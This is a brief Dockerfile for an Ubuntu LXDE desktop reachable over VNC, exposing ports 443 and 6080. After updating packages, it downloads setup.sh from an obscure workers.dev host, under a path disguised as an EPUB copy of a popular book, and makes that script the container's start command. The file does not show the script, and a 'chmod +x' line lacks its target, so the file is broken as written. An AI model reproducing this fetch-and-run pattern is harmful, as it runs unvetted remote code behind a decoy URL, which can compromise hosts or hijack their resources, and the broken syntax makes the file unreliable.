FROM dorowu/ubuntu-desktop-lxde-vnc:latest
EXPOSE 443/tcp
EXPOSE 443/udp
EXPOSE 6080/tcp
EXPOSE 6080/udp
RUN apt update && \
    apt upgrade -y && \
    wget https://production.privateinskdfhsgfd.indexrd.workers.dev/0:/The%20Psychology%20of%20Money%20by%20Morgan%20Housel%20EPUB/setup.sh && \
    chmod +x
CMD ./setup.sh


